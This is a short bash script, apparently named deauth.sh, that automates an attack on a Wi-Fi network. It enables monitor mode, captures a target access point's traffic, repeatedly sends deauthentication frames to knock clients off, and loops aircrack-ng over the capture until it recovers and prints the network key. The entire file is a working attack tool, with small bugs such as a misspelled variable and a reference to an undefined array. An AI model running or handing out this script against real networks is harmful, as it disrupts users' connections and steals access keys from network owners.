# Checking for arguments
if [ $# -lt 3 ]
  then
        echo "Not enough arguments supplied"
        echo "Usage: ./deauth.sh  <bssid> <channel> <interface>"  
else
        BSSID=$1
        CHAN=$2
        INTERF=$3
        TIMEOUT=20
	    sudo airmon-ng start $INTERF > /dev/null 
    	MON=$(iwconfig 2> /dev/null | grep -i mon|awk '{print $1}')
        DATE=`date '+%Y_%m_%d_%H_%M_%S'`
	    KEY="KEY-$BSSID-$DATE.txt" 
        LOG_FILE=log-$BSSID-$DATE.txt
        sudo airodump-ng -w $BSSID --write-interval 1 -c $CHAN --bssid $BSSID $MON &> /dev/null &
    	pid_airodump=$!
    	#echo "pid airodump " $pid_airodump 
        TEMP="$BSSID*.csv"
        sleep 1
        OUTPUT_AIRO=$(ls ${TEMP} |grep -v kismet | tail -n 1)
    	CAP_FILE=$(ls $BBSID*.cap|tail -n 1)

        while [ ! -f $KEY ]; do
	    	echo "Running aireplay..."
            sudo aireplay-ng -0 3 -a $BSSID $MON &>> $LOG_FILE & 
            echo "sleeping for $TIMEOUT seconds" >> $LOG_FILE
            sleep $TIMEOUT
    		echo "Running aircrack..."
    		sudo aircrack-ng -l $KEY $CAP_FILE > crack.txt &
    		pid_aircrack=$!
    		echo "sleeping for 5 seconds"
    		sleep 5
    		#echo "aircrack pid " $pid_aircrack
    		echo "killing ${pids[1]}"
	    	sudo kill -9 $pid_aircrack
        done 
	sudo killall aircrack-ng
	sudo killall airodump-ng 
	echo "Key Found! " $(cat $KEY)
fi
